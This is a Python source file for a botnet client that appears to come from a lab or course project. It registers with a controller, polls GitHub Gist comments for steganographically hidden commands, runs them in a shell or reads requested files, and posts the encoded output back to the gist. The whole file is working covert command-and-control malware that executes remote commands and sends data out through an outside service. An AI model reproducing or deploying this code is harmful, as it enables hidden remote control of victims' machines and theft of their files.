import atexit
import requests
import subprocess
from flask import Flask, jsonify

from apscheduler.schedulers.background import BackgroundScheduler
from helpers import gist_get_last_comments, gist_add_comment, steg_decode, steg_encode, CMD_COVERED, COMMANDS

SCHED = BackgroundScheduler()
SCHED.start()

SLEEP_PERIOD_COMMENT = 8
CONTROLLER_URL = "http://127.0.0.1:5001"


BOT_PORT = 1111
LAST_COMMENT = None

app = Flask(__name__)

@app.route("/status", methods=["GET"])
def alive_status_check():
    return { "status": "Up" }, 200

def subprocess_exec(cmd):
    return subprocess.getoutput(cmd)

def create_copy(fileName):
    return open(fileName, "r").read()

def comments_check(gistId):
    global LAST_COMMENT
    last = gist_get_last_comments(gistId)

    if last is None or last == "":
        print("last: none")
        return

    last_decoded = steg_decode(last)

    if LAST_COMMENT is None or last_decoded != LAST_COMMENT:
        cmd = last_decoded.split()
        if (len(cmd) == 0):
            cmd = []
            cmd.append(last_decoded)

        if cmd[0] == "exit":
            unregister_self(gistId)
            output = "exit"
            print("Exiting...")
            quit()
        elif cmd[0] == "copy":
            output = create_copy(cmd[1])
            print("Copied.")
        elif cmd[0] == "binary":
            output = subprocess_exec("./" + cmd[1])
            print(output)
        else:
            output = subprocess_exec(last_decoded)
            print(output)

        print(last_decoded)

        LAST_COMMENT = last_decoded

        msg = CMD_COVERED[cmd[0]]
        gist_add_comment(gistId, steg_encode(msg, output))



def unregister_self(gistId):
    if gistId is not None and gistId != "":
        requests.delete(CONTROLLER_URL + "/bot-unregister?gistId=" + gistId)

# register bot at the beginning and get id
res = requests.get(CONTROLLER_URL + "/bot-register")
# print(res.json())
gistId = res.json().get("gistId")
# print(gistId)

# if __name__ == '__main__':
if gistId is None:
    print("An error occured...")
else:
    comments_check(gistId)
    SCHED.add_job(func=comments_check, args=[gistId], trigger="interval", seconds=SLEEP_PERIOD_COMMENT)
    app.run(host="127.0.0.1", port=BOT_PORT)

# at exit, delete gist
atexit.register(lambda: unregister_self(gistId))
